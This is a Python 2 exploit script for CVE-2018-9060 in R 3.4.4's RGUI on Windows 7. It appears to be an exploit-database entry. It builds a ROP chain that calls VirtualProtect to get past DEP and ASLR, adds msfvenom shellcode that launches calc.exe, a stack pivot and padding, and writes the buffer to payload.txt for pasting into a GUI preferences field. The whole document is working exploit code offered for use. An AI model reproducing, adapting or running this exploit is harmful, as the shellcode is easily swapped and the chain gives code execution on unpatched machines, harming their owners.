#!/usr/bin/env python2

# Exploit Title: R 3.4.4 exploit (DEP+ASLR) -> copy payload into "Language for menus"
# Date: 03/03/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86
# CVE : CVE-2018-9060
# Usage: 
#  - execute exploit and copy content of payload.txt
#  - Open RGUI.exe
#  - "Edit" Menu -> "Gui Preferences" 
#  - paste content of payload.txt into "Languages for menu and messages"


import struct

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [

      #[---INFO:gadgets_to_set_esi:---]
      0x6cacc7e2,  # POP EAX # RETN [R.dll] 
      0x643cb170,  # ptr to &VirtualProtect() [IAT Riconv.dll]
      0x6cba1814,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [R.dll] 
      0x6cb14df6,  # XCHG EAX,ESI # RETN [R.dll] 

      #[---INFO:gadgets_to_set_ebp:---]
      0x6ff1b5d7,  # POP EBP # RETN [grDevices.dll] 
      0x6ca477ed,  # & jmp esp [R.dll]

      #[---INFO:gadgets_to_set_ebx:---]
      0x6cbebfa6,  # POP EAX # RETN [R.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x6375e41f,  # NEG EAX # RETN [Rgraphapp.dll] 
      0x63969772,  # XCHG EAX,EBX # RETN [graphics.dll] 

      #[---INFO:gadgets_to_set_edx:---]
      0x6ff3b088,  # POP ECX # RETN [grDevices.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x71364d80,  # NEG ECX # RETN [stats.dll] 
      0x6ca29048,  # MOV EDX,ECX # POP ESI # RETN [R.dll] 
      0x41414141,  # Filler (compensate)

      #[---INFO:gadgets_to_set_esi:---]
      0x6cacc7e2,  # POP EAX # RETN [R.dll] 
      0x643cb170,  # ptr to &VirtualProtect() [IAT Riconv.dll]
      0x6cba1814,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [R.dll] 
      0x6cb14df6,  # XCHG EAX,ESI # RETN [R.dll] 

      #[---INFO:gadgets_to_set_ecx:---]
      0x7139d4a8,  # POP ECX # RETN [stats.dll] 
      0x713ba424,  # &Writable location [stats.dll]

      #[---INFO:gadgets_to_set_edi:---]
      0x6fea5ad8,  # POP EDI # RETN [grDevices.dll] 
      0x6375fe5c,  # RETN (ROP NOP) [Rgraphapp.dll]

      #[---INFO:gadgets_to_set_eax:---]
      0x7135a862,  # POP EAX # RETN [stats.dll] 
      0x90909090,  # nop

      #[---INFO:pushad:---]
      0x6ff11558,  # PUSHAD # RETN [grDevices.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



offset=900

# msfvenom -p windows/exec cmd=calc.exe -b "\x0a\x00\x0d" -f python -v shellcode
shellcode =  b""
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\xba\x0e\xa1\xc8\x79\xd9\xd0\xd9\x74\x24\xf4"
shellcode += b"\x5e\x29\xc9\xb1\x31\x31\x56\x13\x83\xee\xfc"
shellcode += b"\x03\x56\x01\x43\x3d\x85\xf5\x01\xbe\x76\x05"
shellcode += b"\x66\x36\x93\x34\xa6\x2c\xd7\x66\x16\x26\xb5"
shellcode += b"\x8a\xdd\x6a\x2e\x19\x93\xa2\x41\xaa\x1e\x95"
shellcode += b"\x6c\x2b\x32\xe5\xef\xaf\x49\x3a\xd0\x8e\x81"
shellcode += b"\x4f\x11\xd7\xfc\xa2\x43\x80\x8b\x11\x74\xa5"
shellcode += b"\xc6\xa9\xff\xf5\xc7\xa9\x1c\x4d\xe9\x98\xb2"
shellcode += b"\xc6\xb0\x3a\x34\x0b\xc9\x72\x2e\x48\xf4\xcd"
shellcode += b"\xc5\xba\x82\xcf\x0f\xf3\x6b\x63\x6e\x3c\x9e"
shellcode += b"\x7d\xb6\xfa\x41\x08\xce\xf9\xfc\x0b\x15\x80"
shellcode += b"\xda\x9e\x8e\x22\xa8\x39\x6b\xd3\x7d\xdf\xf8"
shellcode += b"\xdf\xca\xab\xa7\xc3\xcd\x78\xdc\xff\x46\x7f"
shellcode += b"\x33\x76\x1c\xa4\x97\xd3\xc6\xc5\x8e\xb9\xa9"
shellcode += b"\xfa\xd1\x62\x15\x5f\x99\x8e\x42\xd2\xc0\xc4"
shellcode += b"\x95\x60\x7f\xaa\x96\x7a\x80\x9a\xfe\x4b\x0b"
shellcode += b"\x75\x78\x54\xde\x32\x76\x1e\x43\x12\x1f\xc7"
shellcode += b"\x11\x27\x42\xf8\xcf\x6b\x7b\x7b\xfa\x13\x78"
shellcode += b"\x63\x8f\x16\xc4\x23\x63\x6a\x55\xc6\x83\xd9"
shellcode += b"\x56\xc3\xe7\xbc\xc4\x8f\xc9\x5b\x6d\x35\x16"


rop_chain = create_rop_chain()

stack_pivot = 0x6fec9af6 # {pivot 316 / 0x13c} :  # ADD ESP,13C # RETN

buf = "A" * 292
buf += rop_chain
buf += shellcode
buf += "B" * (offset - 292 - len (rop_chain) - len(shellcode))
buf += struct.pack('<I', stack_pivot)
buf += "B"*5000

 	
f = open("payload.txt", "w")
f.write(buf)
f.close()
